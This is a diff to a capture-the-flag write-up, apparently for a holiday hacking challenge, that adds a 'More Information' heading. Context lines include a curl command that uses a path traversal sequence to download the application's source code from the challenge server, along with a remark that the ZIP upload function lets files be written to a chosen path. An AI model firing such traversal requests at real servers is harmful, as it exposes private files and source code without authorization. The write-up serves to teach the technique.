@@ -23,12 +23,14 @@ PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sb
 ```
 So the `GREETZ` variable contains **JackFrostWasHere**
 
+**More Information**
+
 The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-8/app.rb) can be downloaded through
 ```
 curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app.rb --output app.rb
 ```
 This code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTY1OTUwNDczOSwtMjQzOTQyODY2LDEzMT
-IwNTY0NTMsOTIwNDU1ODY1LC0xNjA2MDc4MDQwXX0=
+eyJoaXN0b3J5IjpbLTE0Njc2MTUyNjIsLTI0Mzk0Mjg2NiwxMz
+EyMDU2NDUzLDkyMDQ1NTg2NSwtMTYwNjA3ODA0MF19
 -->
